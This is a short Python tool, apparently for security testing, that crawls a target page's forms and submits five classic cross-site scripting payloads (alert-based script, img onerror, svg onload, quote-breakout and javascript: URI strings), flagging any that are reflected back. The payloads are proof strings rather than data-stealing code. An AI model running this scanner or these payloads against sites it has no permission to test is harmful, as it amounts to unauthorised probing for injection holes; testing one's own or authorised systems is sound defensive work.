import requests
from bs4 import BeautifulSoup

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url if target_url.startswith('http') else f'http://{target_url}'
        self.payloads = [
            """<script>alert(1)</script>""",
            """<img src=x onerror=alert(1)>""",
            """' "><script>alert(1)</script>""",
            """<svg onload=alert(1)>""",
            """javascript:alert(1)"""
        ]

    def find_forms(self, url):
        try:
            res = requests.get(url, timeout=10)
            soup = BeautifulSoup(res.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[!] Error fetching forms: {e}")
            return []

    def scan(self):
        print(f"\n[*] Scanning for XSS on {self.target_url}...")
        forms = self.find_forms(self.target_url)
        print(f"[*] Found {len(forms)} forms.")

        for i, form in enumerate(forms):
            print(f"[*] Testing form #{i+1}...")
            inputs = form.find_all(['input', 'textarea'])
            
            for payload in self.payloads:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name:
                        data[name] = payload
                
                if not data:
                    continue

                try:
                    method = form.get('method', 'get').lower()
                    if method == 'post':
                        res = requests.post(self.target_url, data=data, timeout=10)
                    else:
                        res = requests.get(self.target_url, params=data, timeout=10)
                    
                    if payload in res.text:
                        print(f"[+] POTENTIAL XSS: Payload {payload} reflected in response!")
                except Exception as e:
                    print(f"[-] Error sending payload: {e}")

    def run(self):
        self.scan()
